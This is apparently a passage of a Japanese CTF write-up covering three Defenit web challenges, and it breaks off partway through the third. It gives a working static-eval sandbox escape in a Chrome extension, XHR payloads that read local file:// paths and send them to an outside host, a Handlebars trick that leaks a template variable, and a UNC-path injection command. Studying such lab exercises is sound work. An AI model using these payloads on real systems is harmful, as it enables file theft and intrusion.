                        (err, result) => {
                            if (err) throw err;
                            res.redirect('/login');
                        }
                    );
                } else {
                    res.end('Username already exist.');
                }
            }
        );

    } else {
        res.end('Invalid Input');
    }

});

app.get('/logout', (req, res) => {
    res.clearCookie('session');
    res.redirect('/');
})

app.use((req, res, next) => {
    if (res.session === null) res.redirect('/login');
    else next();
});

app.get('/list', (req, res) => {
    conn.query(
        'select * from board where user_id = ?',
        [req.session.id],
        (err, result) => {
            if (err) throw err;
            res.render('list', { posts: result })
        }
    )
});

app.get('/read', (req, res) => {

    let { id } = req.query;

    conn.query(
        'select * from board where id = ?',
        [id],
        (err, result) => {
            if (err) throw err;


            if (result.length === 0) {
                res.end('Not exist')
            } else if (req.session && result[0].user_id ===  req.session.id || req.session && req.session.username === 'this-is-the-super-admin-name') {
                res.render('read', { content: result[0].content });
            } else {
                res.end('No permission');
            }
        }
    )
});

app.get('/write', (req, res) => {
    res.render('write');
});

app.post('/write', (req, res) => {

    let { content } = req.body;

    conn.query(
        'insert into board values (NULL, ?, ?)',
        [req.session.id, content],
        (err, result) => {
            if (err) throw err;
            res.redirect(`/read?id=${result.insertId}`);
        }
    )
});

app.get('/report', (req, res) => {
    res.render('report');
});

let hist = {};

app.post('/report', (req, res) => {
    let { url } = req.body;
    if (typeof url === 'string' && /^http:\/\/highlighter\.ctf\.defenit\.kr\//.test(url)) {
        (async () => {
            if (hist[req.connection.remoteAddress] && Date.now() - hist[req.connection.remoteAddress] < 30000) {
                res.end('Try after 30 seconds');
            } else {
                console.log(url);
                await driver.get(url);
                await res.end('Your request has been processed');
            }
            hist[req.connection.remoteAddress] = Date.now();
        })();
    } else {
        res.end('Invalid URL');
    }
});

app.listen(8080);
```

メモ帳的なサービスのようです。`/write` で記事を投稿すると投稿した本人もしくは admin のみが見られるパーマリンク (パスは `/read`、記事の ID が GET パラメータから与えられる) が発行されるようです。

また、`/report` から記事の URL を報告すると `selenium` コンテナから admin がアクセスしに行くようです。

添付されている `SuperHighlighter.crx` という Chrome 拡張を有効化すると、記事ページで `#0` のようにフラグメント識別子から数値を与えた場合には 1 番目の単語が `<span style="color: red;">poyo</span>` のようにハイライトされ、`#'poyo'` のように文字列を与えた場合には `poyo` という単語がハイライトされます。便利ですね。

`app.js` 自体に脆弱性がないか探してみましたが、SQLi や XSS、パストラバーサルなど広い範囲で考えてもどこにもないように見えます。admin が使うブラウザでは `SuperHighlighter.crx` が有効化されているようですから、これになにか脆弱性があるのでしょうか。解析していきましょう。

`SuperHighlighter.crx` を ZIP として展開すると `manifest.json` `js/background.js` `js/inject.js` などのファイルが出てきました。

`manifest.json` は以下のような内容でした。

```javascript
{
  "name": "Super Highlighter",
  "version": "1.0.0",
  "manifest_version": 2,
  "description": "Highlight your words using keyword or index!",
  "homepage_url": "https://ctf.defenit.kr",
  "permissions": [
    "http://*/*",
    "https://*/*",
    "file://*/*"
  ],
  "background": {
    "scripts": ["js/background.js"],
    "persistent": true
  },
  "content_security_policy": "script-src 'self' https://accounts.google.com 'unsafe-eval'; object-src 'self'"
}
```

`file://*/*` にアクセスできるようなパーミッションであることが気になります。`selenium` コンテナにはフラグが置かれているはずですから、Chrome 拡張のコンテキストであれば `XMLHttpRequest` などでアクセスできるのではないでしょうか。

`content_security_policy` という Chrome 拡張内で使われる Content Security Policy のポリシーを設定するプロパティでは `unsafe-eval` ディレクティブが許可されています。この Chrome 拡張内で `eval` を呼んでいるのでしょうか。だとすれば、ユーザ入力を `eval` させることはできないでしょうか。

`js/background.js` がバックグラウンドで実行されているようですから、こちらから読もう…かと思いましたが、340 kB とサイズが大きく読むのが面倒そうなので `js/inject.js` から読みましょう。`js/background.js` から読み込まれているはずです。

```javascript
var { pathname, host } = window.location;

if (pathname === '/read' && host === 'highlighter.ctf.defenit.kr') {

    let post = document.getElementById('content');
    let keyword = location.hash.substr(1);

    if (post && post.innerText && keyword) {
        chrome.runtime.sendMessage(
            { content: post.innerText, keyword },
            function (response) {
                post.innerHTML = response;
            }   
        );
    }

}
```

ホスト名が問題サーバのものであり、かつパスが `/read` であれば、フラグメント識別子と記事の内容を [`chrome.runtime.sendMessage`](https://developer.chrome.com/apps/runtime#method-sendMessage) で `js/background.js` に送り、処理された結果を `innerHTML` で挿入しているようです。コールバック関数に渡される引数は HTML ですから、ここで XSS ができたりしそうです。

`js/background.js` は minify されているようですから、読んでいく前に [JS Beautifier](https://github.com/beautify-web/js-beautify) などで整形しておきます。

`chrome.runtime.sendMessage` で送られたメッセージがどのように処理されているか確認します。[`chrome.runtime.onMessage`](https://developer.chrome.com/apps/runtime#event-onMessage) でメッセージが送られたときに実行されるイベントハンドラを登録できるようですから、検索してみましょう。

```javascript
︙
  }), chrome.runtime.onMessage.addListener(function(e, t, n) {
      var r = e.keyword,
          i = e.content;
      if (!r || !i) return void n("Something wrong.");
      try {
          var s = l(r).body[0].expression;
          r = (0, u.default)(s)
      } catch (e) {}
      var a = i.split(/\W/),
          h = "";
      console.log(a);
      for (var p in a) "string" == typeof r && a[p] == r ? h += '<span style="color: red;">' + r + "</span> " : h += "number" == typeof r && p == r ? '<span style="color: red;">' + a[p] + "</span> " : "<span>" + a[p] + "</span> ";
      h = c.default.sanitize(h), h = o.default.htmlPrefilter(h), document.body.innerHTML = "", document.write(h), h = document.body.innerHTML, n(h.trim())
  })
}, function(e, t, n) {
︙
```

見つかりました。条件演算子やカンマ演算子が多用されていて読みづらいので、手で整形します。

```javascript
chrome.runtime.onMessage.addListener(function(e, t, n) {
        var r = e.keyword,
            i = e.content;
        if (!r || !i) return void n("Something wrong.");
        try {
            var s = l(r).body[0].expression;
            r = (0, u.default)(s)
        } catch (e) {}
        var a = i.split(/\W/),
            h = "";
        console.log(a);

        for (var p in a) {
            if ("string" == typeof r && a[p] == r) {
                  h += '<span style="color: red;">' + r + "</span> "
            } else { 
                if ("number" == typeof r && p == r) {
                    h += '<span style="color: red;">' + a[p] + "</span> "
                } else {
                    h += "<span>" + a[p] + "</span> ";
                }
            }
        }

        h = c.default.sanitize(h);
        h = o.default.htmlPrefilter(h);
        document.body.innerHTML = "";
        document.write(h);
        h = document.body.innerHTML;

        n(h.trim())
    })
```

記事の内容を英数字以外の文字で区切り (= 英数字以外を削除し)、各単語について、フラグメント識別子として与えたものが数値であれば単語の位置と一致している場合に、文字列であればその単語と一致している場合にハイライトをしているようです。

先ほどは XSS できそうな雰囲気がありましたが、記事の内容からは英数字以外が削除されてしまい、また `sanitize` というメソッド名からおそらく DOMPurify で、`htmlPrefilter` からおそらく jQuery の `htmlPrefilter` で HTML が無害化されてしまうためやはり難しそうに思えます。

ところで、フラグメント識別子に対しては `var s = l(r).body[0].expression;` `r = (0, u.default)(s)` という謎の処理がなされています。`l` と `u.default` はそれぞれどのような関数なのでしょうか。

`l` には以下のような関数が入っていました。

```javascript
            function r(e, t, n) {
                var r = null,
                    i = function(e, t) {
                        n && n(e, t), r && r.visit(e, t)
                    },
                    u = "function" == typeof n ? i : null,
                    s = !1;
                if (t) {
                    s = "boolean" == typeof t.comment && t.comment;
                    var l = "boolean" == typeof t.attachComment && t.attachComment;
                    (s || l) && (r = new o.CommentHandler, r.attach = l, t.comment = !0, u = i)
                }
                var h = !1;
                t && "string" == typeof t.sourceType && (h = "module" === t.sourceType);
                var p;
                p = t && "boolean" == typeof t.jsx && t.jsx ? new a.JSXParser(e, t, u) : new c.Parser(e, t, u);
                var d = h ? p.parseModule() : p.parseScript(),
                    f = d;
                return s && r && (f.comments = r.comments), p.config.tokens && (f.tokens = p.tokens), p.config.tolerant && (f.errors = p.errorHandler.errors), f
            }
```

`CommentHandler` `JSXParser` などの特徴的な識別子を GitHub で検索すると、[Esprima](https://github.com/jquery/esprima) という JavaScript パーサのコードが見つかりました。[parse](https://github.com/jquery/esprima/blob/45c9ab14d96f7f7fa88333fdd897487a8c20082f/src/esprima.ts#L30) という関数のようです。

`u.default` には以下のような関数が入っていました。

```javascript
function(e, t) {
        t || (t = {});
        var n = {},
            i = function e(i, u) {
                if ("Literal" === i.type) return i.value;
                if ("UnaryExpression" === i.type) {
                    var s = e(i.argument);
                    return "+" === i.operator ? +s : "-" === i.operator ? -s : "~" === i.operator ? ~s : "!" === i.operator ? !s : n
                }
                if ("ArrayExpression" === i.type) {
                    for (var o = [], a = 0, c = i.elements.length; a < c; a++) {
                        var l = e(i.elements[a]);
                        if (l === n) return n;
                        o.push(l)
                    }
                    return o
                }
                if ("ObjectExpression" === i.type) {
                    for (var h = {}, a = 0; a < i.properties.length; a++) {
                        var p = i.properties[a],
                            d = null === p.value ? p.value : e(p.value);
                        if (d === n) return n;
                        h[p.key.value || p.key.name] = d
                    }
                    return h
                }
                if ("BinaryExpression" === i.type || "LogicalExpression" === i.type) {
                    var c = e(i.left);
                    if (c === n) return n;
                    var f = e(i.right);
                    if (f === n) return n;
                    var D = i.operator;
                    return "==" === D ? c == f : "===" === D ? c === f : "!=" === D ? c != f : "!==" === D ? c !== f : "+" === D ? c + f : "-" === D ? c - f : "*" === D ? c * f : "/" === D ? c / f : "%" === D ? c % f : "<" === D ? c < f : "<=" === D ? c <= f : ">" === D ? c > f : ">=" === D ? c >= f : "|" === D ? c | f : "&" === D ? c & f : "^" === D ? c ^ f : "&&" === D ? c && f : "||" === D ? c || f : n
                }
                if ("Identifier" === i.type) return {}.hasOwnProperty.call(t, i.name) ? t[i.name] : n;
                if ("ThisExpression" === i.type) return {}.hasOwnProperty.call(t, "this") ? t.this : n;
                if ("CallExpression" === i.type) {
                    var m = e(i.callee);
                    if (m === n) return n;
                    if ("function" != typeof m) return n;
                    var g = i.callee.object ? e(i.callee.object) : n;
                    g === n && (g = null);
                    for (var A = [], a = 0, c = i.arguments.length; a < c; a++) {
                        var l = e(i.arguments[a]);
                        if (l === n) return n;
                        A.push(l)
                    }
                    return m.apply(g, A)
                }
                if ("MemberExpression" === i.type) {
                    var h = e(i.object);
                    if (h === n || "function" == typeof h) {
                        console.log('FAILED: "function" == typeof h', i.object);
                        return n;
                    }
                    if ("Identifier" === i.property.type) return h[i.property.name];
                    var p = e(i.property);
                    return p === n ? n : h[p]
                }
                if ("ConditionalExpression" === i.type) {
                    var s = e(i.test);
                    return s === n ? n : e(s ? i.consequent : i.alternate)
                }
                if ("ExpressionStatement" === i.type) {
                    var s = e(i.expression);
                    return s === n ? n : s
                }
                if ("ReturnStatement" === i.type) return e(i.argument);
                if ("FunctionExpression" === i.type) {
                    var C = i.body.body,
                        E = {};
                    Object.keys(t).forEach(function(e) {
                        E[e] = t[e]
                    }), i.params.forEach(function(e) {
                        "Identifier" == e.type && (t[e.name] = null)
                    });
                    for (var a in C)
                        if (e(C[a]) === n) return n;
                    t = E;
                    var y = Object.keys(t),
                        x = y.map(function(e) {
                            return t[e]
                        });
                    return Function(y.join(", "), "return " + r(i)).apply(null, x)
                }
                if ("TemplateLiteral" === i.type) {
                    for (var F = "", a = 0; a < i.expressions.length; a++) F += e(i.quasis[a]), F += e(i.expressions[a]);
                    return F += e(i.quasis[a])
                }
                if ("TaggedTemplateExpression" === i.type) {
                    var v = e(i.tag),
                        S = i.quasi,
                        B = S.quasis.map(e),
                        b = S.expressions.map(e);
                    return v.apply(null, [B].concat(b))
                }
                return "TemplateElement" === i.type ? i.value.cooked : n
            }(e);

        return i === n ? void 0 : i
    }
```

コードからは見つけられませんでしたが、`js/background.js` に含まれていた  `package.json` らしきオブジェクトに `_requiredBy: ["/static-eval"],` という記述があり、[static-eval](https://github.com/browserify/static-eval) というライブラリのコードであることがわかりました。

フラグメント識別子を数値や文字列に変換するために安全な `eval` の代替として使おうとしているようですが、`README.md` を読むと

> static-eval is like eval. It is intended for use in build scripts and code transformations, doing some evaluation at build time—it is **NOT** suitable for handling arbitrary untrusted user input. Malicious user input can execute arbitrary code.

とそのような使い方は推奨されていないことがわかります。具体的にどのような問題があるのかプルリクを見ていると、[`__proto__` や `constructor` へのアクセスを不可能にするプルリク](https://github.com/browserify/static-eval/pull/27)が見つかりました。これでサンドボックスからの脱出ができたりしたのでしょうか。

`js/background.js` に含まれていたコードと比較すると、このプルリクで修正された処理は追加されておらず、これ以前のバージョンであることがわかります。このプルリクには[テストが含まれています](https://github.com/browserify/static-eval/blob/a18a308120ac7d5bc974292a8eefb3dfc0649f61/test/eval.js#L114)から、これが有効か試してみましょう。

`/read?id=42#(function(x){return''[!x?'__proto__':'constructor'][x]})('constructor')('alert(1)')()` にアクセスしてみるとアラートが表示されました。`alert(1)` を `alert(location)` に変えると `chrome-extension://` から始まる URL が表示されたので、Chrome 拡張のコンテキストで `eval` 相当のことができているようです。やった!

それでは、フラグが置かれているパスを探しましょう。Chrome 拡張のコンテキストでは、`manifest.json` で確認したとおり `file://` から始まる URL にも XHR などでアクセスできることを利用して、`file:///` でルートディレクトリにあるファイルとディレクトリを取得しましょう。

まず、以下のような内容の記事を投稿します。

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///');
xhr.onload = function() {
  var fs = xhr.responseText.match(/addRow\("(.+?)"/g).map(x => x.slice(8, -1));
  (new Image).src = 'https://(省略)?' + encodeURIComponent(fs);
};
xhr.send();
```

`/read?id=(記事の ID)#(function(x){return''[!x?'__proto__':'constructor'][x]})('constructor')('String.prototype.split=function(){eval(String(this));return[this]}')()` にアクセスすると `String.prototype.split` が `this` を `eval` するものに置き換えられ、英数字以外の文字で区切るときの処理で記事の内容が `eval` されるはずです。URL を `/report` から報告すると以下のような HTTP リクエストが来ました。

```
6339e914b333b35d902a2dfd2c415656,bin,boot,dev,etc,home,lib,lib64,media,mnt,opt,proc,root,run,sbin,srv,sys,tmp,usr,var,_dockerenv
```

`6339e914b333b35d902a2dfd2c415656` が怪しそうです。XHR で開く URL を `file:///6339e914b333b35d902a2dfd2c415656/` に変えます。

```
flag
```

`/6339e914b333b35d902a2dfd2c415656/flag` にフラグがありそうです。これを取得するような処理を書きます。

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///6339e914b333b35d902a2dfd2c415656/flag');
xhr.onload = function() {
  (new Image).src = 'https://(省略)?' + encodeURIComponent(xhr.responseText);
};
xhr.send();
```

`/read?id=(記事の ID)#(function(x){return''[!x?'__proto__':'constructor'][x]})('constructor')('String.prototype.split=function(){eval(String(this));return[this]}')()` にアクセスさせると以下のような HTTP リクエストが来ました。

```
Defenit{Ch20m3_3x73n510n_c4n_b3_m0re_Inte7e5t1ng}
```

フラグが得られました。

```
Defenit{Ch20m3_3x73n510n_c4n_b3_m0re_Inte7e5t1ng}
```

## [Web 248] BabyJS (47 solves)
> Render me If you can.
> 
> Author: @posix
> 
> 添付ファイル: babyjs.tar.gz

`babyjs.tar.gz` を展開すると、以下のようなソースコードが出てきました。

```javascript
const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');
const app = express();

const SALT = crypto.randomBytes(64).toString('hex');
const FLAG = require('./config').FLAG;

app.set('view engine', 'html');
app.engine('html', require('hbs').__express);

if (!fs.existsSync(path.join('views', 'temp'))) {
    fs.mkdirSync(path.join('views', 'temp'));
}

app.use(express.urlencoded());
app.use((req, res, next) => {
    const { content } = req.body;

    req.userDir = crypto.createHash('md5').update(`${req.connection.remoteAddress}_${SALT}`).digest('hex');
    req.saveDir = path.join('views', 'temp', req.userDir);

    if (!fs.existsSync(req.saveDir)) {
        fs.mkdirSync(req.saveDir);
    }

    if (typeof content === 'string' && content.indexOf('FLAG') != -1 || typeof content === 'string' && content.length > 200) {
        res.end('Request blocked');
        return;
    }

    next();
});

app.get('/', (req, res) => {
    const { p } = req.query;
    if (!p) res.redirect('/?p=index');
    else res.render(p, { FLAG, 'apple': 'mint' });
});

app.post('/', (req, res) => {
    const { body: { content }, userDir, saveDir } = req;
    const filename = crypto.randomBytes(8).toString('hex');

    let p = path.join('temp', userDir, filename)
    
    fs.writeFile(`${path.join(saveDir, filename)}.html`, content, () => {
        res.redirect(`/?p=${p}`);
    })
});

app.listen(8080, '0.0.0.0');
```

メモ帳的なサービスでしょうか。

`/` にテンプレートを入力すると `temp/(IP アドレス + ソルトの MD5 ハッシュ)/(ランダムな hex 文字列).html` に保存されるようです。その後 `/?p=(HTML の保存先)` にアクセスすると [Handlebars](https://handlebarsjs.com/) によってテンプレートとして解釈されて変数などが展開された上で、その内容を返すようです。

`res.render(p, { FLAG, 'apple': 'mint' })` とテンプレートのレンダリングに `FLAG` という名前でフラグが渡されており、`{% raw %}{{FLAG}}{% endraw %}` と入力すればそれで終わりそうですが、残念ながらそこまで甘くはありません。以下のフィルターによって阻まれてしまいます。

```javascript
app.use((req, res, next) => {
    const { content } = req.body;

    req.userDir = crypto.createHash('md5').update(`${req.connection.remoteAddress}_${SALT}`).digest('hex');
    req.saveDir = path.join('views', 'temp', req.userDir);

    if (!fs.existsSync(req.saveDir)) {
        fs.mkdirSync(req.saveDir);
    }

    if (typeof content === 'string' && content.indexOf('FLAG') != -1 || typeof content === 'string' && content.length > 200) {
        res.end('Request blocked');
        return;
    }

    next();
});
```

HTTP リクエストボディが 201 文字以上でないか、また `FLAG` という文字列が含まれていないかなどがチェックされています。

`{% raw %}{{globals['FL'+'AG']}}{% endraw %}` みたいなことができればよいのですが、[Handlebars のドキュメント](https://handlebarsjs.com/api-reference/)を読むとデフォルトではかなり機能が絞られており、文字列の結合だとか変数の比較だとかいった機能はなく、そのような複雑なことはできないとわかります。

それでもなんとかなるだろうとドキュメントを眺めてたりいろいろ試したりしていたところ、`.` は現在のコンテキストを意味するので、`{% raw %}{{.}}{% endraw %}` で与えられている変数すべてをオブジェクトとして参照できる (ただし、文字列化されるのでこの例は `[object Object]` になる) ことがわかりました。

[`#each`](https://handlebarsjs.com/guide/builtin-helpers.html#each) というヘルパーを使えばオブジェクトに対して反復的に処理ができ、`#each` によって囲まれているブロックで [`@key`](https://handlebarsjs.com/api-reference/data-variables.html#key) という変数を使えば現在参照されているキーが得られます。

`{% raw %}{{#each .}}{{@key}}<br>{{/each}}{% endraw %}` で以下のような出力が得られました。

```
settings
FLAG
apple
_locals
cache
```

`FLAG` もちゃんと含まれているようです。

`#each` で囲まれている中で `.` を使えば現在参照されている値を得られますから、`{% raw %}{{#each .}}{{.}}<br>{{/each}}{% endraw %}` を試してみましょう。

```
TypeError: /app/views/temp/…/9475fa47128c9ad6.html: Cannot convert object to primitive value
    at Object.escapeExpression (/app/node_modules/handlebars/dist/cjs/handlebars/utils.js:91:17)
    at eval (eval at createFunctionContext (/app/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:262:23), <anonymous>:1:20)
    at prog (/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:268:12)
    at execIteration (/app/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)
    at /app/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:83:15
    at Array.forEach (<anonymous>)
    at /app/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:78:32
    at Object.<anonymous> (/app/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:91:11)
    at Object.wrapper (/app/node_modules/handlebars/dist/cjs/handlebars/internal/wrapHelper.js:15:19)
    at Object.eval [as main] (eval at createFunctionContext (/app/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:262:23), <anonymous>:8:52)
```

`Cannot convert object to primitive value` と怒られてしまいました。文字列化できないオブジェクトを参照してしまったようなので、`toString` という文字列化時に呼び出されるメソッドを持っているかどうかを確認するようにしましょう。

`{% raw %}{{#each .}}{{#if (lookup . "toString")}}{{.}}<br>{{/if}}{{/each}}{% endraw %}` で以下のような出力が返ってきました。

```
[object Object]
Defenit{w3bd4v_0v3r_h7tp_n71m_0v3r_Sm8}
mint
```

フラグが得られました。

```
Defenit{w3bd4v_0v3r_h7tp_n71m_0v3r_Sm8}
```

## [Web 810] AdultJS (5 solves)
> Are you over 18?  
> This challenge is for adults :D
> 
> ヒント
> - Adult-JS is Served by Windows
> - UNC Path
> 
> Author: posix
> 
> 添付ファイル: adult-js.zip

与えられた `adult-js.zip` ファイルを展開すると、以下のようなソースコードが出てきました。

```javascript
const express = require('express');
const child_process = require('child_process');
const fs = require('fs');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const assert = require('assert');
const hbs = require('hbs');
const app = express();

const FLAG = fs.readFileSync('./flag').toString();
hbs.registerPartial('FLAG', FLAG);

app.engine('html', hbs.__express);
app.set('view engine', 'html');

var shared = 'ADULT-JS';

app.use(bodyParser.urlencoded({extended: true}));
app.use(bodyParser.json());
app.use(cookieParser(shared))

app.get('/', (req, res) => {
    res.end('Works! :)');
});


app.get('/test', (req, res) => {
    res.render(req.query.p);
});

app.get("/b11a993461d7b578075b91b7a83716e444f5b788f6ab83fcaf8857043e501d59", (req, res) => {
	try {
	b45428ff5 = !req.secure.hd0ea00d1;
	b6189c152 = req.param("h3c6c74df", "b8a2eef98");
	cae79643d = ~~req.fresh.a49a34ba2;
	d1d440033 = !req.baseUrl.h46ca212b;
	f0f69a82a = !req.secure.g780f9a42;
	f423227f7 = req.secure["d367a1d90"];
	g4c7397ed = req.ip["hafac4772"];
	i3298e200 = req.param("e8cb0be9a", {});
	if05cd1f1 = req.baseUrl.fddd83bc9;

	a702dfcdc = Buffer.alloc(12);
	hb1f346ce = [[[[{bb35fa022: this, cdac57734: shared}]]]];
	ec48da640 = {ce69393c0: Function, b46cf2359: 64};
	ha2245af6 = 'fe8e415e1';
	c4ddf69c7 = 'cc89e5fbe';
	c0bf04e03 = 'f0efaf949';
	b7234b3f9 = {e34591e6e: shared, d58a8266f: this};
	b0149a05b = {ffa4bb6dd: this, ad20f2fc7: shared};
	g4c7397ed = g4c7397ed ** g4c7397ed
	f423227f7 = f423227f7.ic8e1e4f3
	cae79643d = cae79643d["f41b2a31e"]
	b45428ff5 = b45428ff5 ** b45428ff5
	f0f69a82a = f0f69a82a ** f0f69a82a

    b7234b3f9 = /ib9dc14a2/.source + '//' + JSON.stringify(f0f69a82a);

	res.attachment(c4ddf69c7);
} catch {
res.end('Error');
}
});

app.get("/c75415dac86b0b931231fc9675ae226e885516f3ae720dad3e80bf94ede31fdf", (req, res) => {
	try {
	d424fe96a = ~~req.fresh.b9250e286;
	d6d6fd5f1 = req.ips.bb9a04250;
	e9edec980 = [req.fresh.h29492c50];
	gcffa031a = req.method["i3a6636af"];
	i07077440 = [req.secure.i5166ee06];
	i87c3fb5c = ~~req.body.f559c17df;
	ic4ad5122 = [req.query.c3548f82a];

	a9c3644ba = [{ea329c1e1: this, i8fe25b56: shared}];
	gf2e454ca = Buffer.allocUnsafe(37);
	c25ef6170 = [[[[{g20718c8c: this, if6889983: shared}]]]];
	d6467023b = {b80ad6db7: this, a7322ce3a: shared};
	e166a7b05 = Buffer.alloc(81);
	a2d568e1b = {af7c27387: this, g8a1e6ea1: shared};
	gec2b8970 = {a6b50b643: shared, h0cf27b37: this};
	eb22a9839 = {c9f8f7a1f: Function, c4980e640: 67};
	i07077440 = i07077440 ** i07077440
	d424fe96a = d424fe96a["da99feee0"]
	d6d6fd5f1 = d6d6fd5f1 ** d6d6fd5f1
	e9edec980 = e9edec980["i653d7723"]

    eb22a9839 = fs.readFileSync(e9edec980);

	res.jsonp(gf2e454ca);
} catch {
res.end('Error');
}
});

︙
```

この調子で 60000 行続いています。フラグは、`hbs.registerPartial('FLAG', FLAG);` という処理から Handlebars のテンプレートで `{% raw %}{{> FLAG}}{% endraw %}` をレンダリングさせれば得られることがわかります。

何千個もあるパスの例として、`/b11a993461d7b578075b91b7a83716e444f5b788f6ab83fcaf8857043e501d59` がどのような機能を持っているか確認します。最後に `res.attachment(c4ddf69c7);` と `c4ddf69c7` に入っているファイル名のファイルを返しているようですが、`c4ddf69c7` には `c4ddf69c7 = 'cc89e5fbe';` とどこにも存在しないファイル名が入っています。これでは何も意味がありません。

おそらく、`req.query` などのユーザ入力が `res.render` や `fs.readFileSync` などの関数に渡されるものを探せということなのでしょう。探索するスクリプトを書きましょう。

各パスの処理から `req.body.f559c17df` や `req.query.c3548f82a` などのユーザ入力のうち参照されるものを抽出し、適当な文字列を注入してリクエストを送ります。

エラーが起こった場合には `res.end('Error');` とただ `Error` とだけ表示されるようになっているようですから、`Error` が表示されないパスを探します。

```python
# coding: utf-8
import re
import requests

with open('app.js', 'r') as f:
  s = f.read()

# app.jsからapp.{get|post}("/hoge", (req, res) => { … });を抽出して配列化
route_m = re.compile(r'^app.([^(]+)\("(.+)"', re.MULTILINE)
render_arg_m = re.compile(r'res\.render\(([^)]+)\)')

lines = s.splitlines()[32:]
funcs = []

start = 0
while True:
  try:
    end = lines.index('});', start + 1)
  except:
    break
  funcs.append((start, end))
  start = end + 2

# 第一引数にapp.{get|post}("/hoge", (req, res) => { … });みたいな文字列
# 第二引数にqueryみたいなreqが持つプロパティを与えると
# req.body.f559c17dfが第一引数に含まれていたときにf559c17dfを返す
def getParam(func, prop):
  return ''.join(re.findall(rf'req\.{prop}(?:\.(\w+)|\["(\w+)"\]|\("(\w+)")', func)[0])

BASE = 'http://localhost:8081'

for i, (start, end) in enumerate(funcs):
  if i % 100 == 0:
    print(i)

  func = '\n'.join(lines[start:end])

  method = route_m.match(func).group(1).upper()
  route = route_m.match(func).group(2)

  url = BASE + route + '?a=b'

  kwds = {}
  if 'req.body' in func:
    if 'data' not in kwds:
      kwds['data'] = {}
    kwds['data'][getParam(func, 'body')] = 'BODY'

  if 'req.get' in func:
    if 'headers' not in kwds:
      kwds['headers'] = {}
    kwds['headers'][getParam(func, 'get')] = 'HEADER'
  
  if 'req.cookies' in func:
    if 'cookies' not in kwds:
      kwds['cookies'] = {}
    kwds['cookies'][getParam(func, 'cookies')] = 'COOKIE'

  if 'req.param' in func and 'req.params' not in func:
    url += f'&{getParam(func, "param")}=PARAM'
  if 'req.query' in func:
    url += f'&{getParam(func, "query")}=QUERY'

  try:
    req = requests.request(method, url, timeout=1, **kwds)

    if req.text != 'Error':
      print(method, url, kwds)
      print(req.headers)
      print(req.text)
      print('---')

      if 'flag-in-here' in req.text:
        break
  except KeyboardInterrupt:
    break
  except:
    pass
```

実行します。

```
$ python find.py
︙
POST http://localhost:8081/f6ea4e6558448496b1cfd7b15b486b204c892ef846633c8c15be97cfae9dc132?a=b {'headers': {'g2a38731a': 'HEADER'}}
{'X-Powered-By': 'Express', 'Content-Security-Policy': "default-src 'none'", 'X-Content-Type-Options': 'nosniff', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '1427', 'Date': 'Mon, 08 Jun 2020 02:57:48 GMT', 'Connection': 'keep-alive'}
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: Failed to lookup view &quot;if57bb0c1&quot; in views directory &quot;(省略)\views&quot;<br> &nbsp; &nbsp;at Function.render ((省略)\node_modules\express\lib\application.js:580:17)…</pre>
</body>
</html>
︙
POST http://localhost:8081/61050c6ef9c64583e828ed565ca424b8be3c585d90a77e52a770540eb6d2a020?a=b {'data': {'hcda7a4f9': 'BODY'}, 'headers': {'d28c3a2a7': 'HEADER'}, 'cookies': {'i77baba57': 'COOKIE'}}
{'X-Powered-By': 'Express', 'Content-Security-Policy': "default-src 'none'", 'X-Content-Type-Options': 'nosniff', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '1423', 'Date': 'Mon, 08 Jun 2020 02:57:49 GMT', 'Connection': 'keep-alive'}
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: Failed to lookup view &quot;BODY&quot; in views directory &quot;(省略)\views&quot;<br> &nbsp; &nbsp;at Function.render ((省略)\node_modules\express\lib\application.js:580:17)…</pre>
</body>
</html>
︙
```

発生したエラーの内容から `/61050c6ef9c64583e828ed565ca424b8be3c585d90a77e52a770540eb6d2a020` が HTTP リクエストボディとして与えたパラメータを `res.render` に渡すようなものになっていることがわかります。

ただ、`flag` があるのは `views` より上ですから `res.render` ではアクセスできませんし、`fs.writeなんとか` のようにファイルに書き込む関数が呼ばれている箇所は `app.js` では見つからず、問題サーバのどこかにテンプレートを書き込めるような機能がないため、好きなテンプレートを読み込ませることはできないように思えます。

ここでヒントを思い出します。

> Adult-JS is Served by Windows

なるほど、問題サーバで同じように `/61050c6ef9c64583e828ed565ca424b8be3c585d90a77e52a770540eb6d2a020` にアクセスしたときに `C:\…` というパスが見え、確かに Windows が使われているように見えます。

> UNC Path

[UNC パス](https://docs.microsoft.com/ja-jp/dotnet/standard/io/file-path-formats#unc-paths)を使ってネットワーク経由でテンプレートを取得させればよいということでしょうか。`/61050c6ef9c64583e828ed565ca424b8be3c585d90a77e52a770540eb6d2a020` で試してみましょう。

UNC パスを与えるとアクセスしに来るか確認します。DNS の名前解決が行われたときに把握できるように、[ettic-team/dnsbin](https://github.com/ettic-team/dnsbin) でドメインを生成します。

`curl -X POST http://(省略)/61050c6ef9c64583e828ed565ca424b8be3c585d90a77e52a770540eb6d2a020 -d 'hcda7a4f9=%5C%5Ctest.f03726c8a2feffdad519.d.zhack.ca%5CC$' -H "d28c3a2a7: a" -b "i77baba57=b"` を実行してみると `test.f03726c8a2feffdad519.d.zhack.ca` の名前解決が発生したことが確認できました。アクセスしに来たようです。

あとは UNC パスを使ってネットワーク経由で SMB サーバを立てるだけ…かと思いきや、SMB サーバを立てて `\\(IP アドレス)\TMP\exploit.html` を参照させても何も起こりません。`nc -lvp 445` で待ち受けてみても接続すらしに来ません。問題サーバ側で SMB の通信や 445 番ポートとの通信がブロックされているのでしょうか。

